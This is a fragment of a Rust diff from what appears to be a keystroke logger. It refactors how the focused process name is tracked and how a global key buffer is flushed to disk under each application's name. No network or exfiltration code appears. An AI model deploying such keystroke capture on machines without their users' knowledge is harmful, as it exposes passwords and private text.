@@ -57,14 +57,7 @@ fn get_focused_process_name() -> ProcessNameResult<(Option<String>, bool)> {
         // Convert UTF-16 to String
         let name = String::from_utf16_lossy(&buffer[..chars_copied as usize]);
 
-        let mut last_name = LAST_PROCESS_NAME.lock()
-            .map_err(|_| "Failed to acquire lock on last process name")?;
-
-        let process_changed = *last_name != Some(name.clone());
-
-        if process_changed {
-            *last_name = Some(name.clone());
-        }
+        let process_changed = *LAST_PROCESS_NAME.lock().unwrap() != Some(name.clone());
 
         Ok((Some(name), process_changed))
     }
@@ -95,9 +88,13 @@ pub fn display_focused_process_name() {
             // We flush the buffer to ensure that "Abc" is logged under "Process1" before
             // we start logging under "Process2" and accepting new characters.
 
-            if let Err(e) = flush_buffer_for_process_change(Some(true)) {
+            if let Err(e) = flush_buffer_for_process_change(Some(&name), Some(true)) {
                 eprintln!("Error flushing buffer for process change: {}", e);
             }
+
+            let mut last_name= LAST_PROCESS_NAME.lock().unwrap();
+
+            *last_name = Some(name.clone())
         }
         Ok((Some(_name), false)) => {
         }
@@ -119,9 +116,9 @@ pub fn display_focused_process_name() {
     }
 }
 
-fn flush_buffer_for_process_change(process_changed: Option<bool>) -> Result<(), Box<dyn std::error::Error>> {
+fn flush_buffer_for_process_change(current_name: Option<&str>, process_changed: Option<bool>) -> Result<(), Box<dyn std::error::Error>> {
     GLOBAL_KEY_BUFFER.lock()
         .map_err(|_| "Failed to acquire buffer lock")?
-        .flush_to_disk(process_changed)
+        .flush_to_disk(current_name, process_changed)
         .map_err(|e| format!("Failed to flush key buffer: {}", e).into())
 }
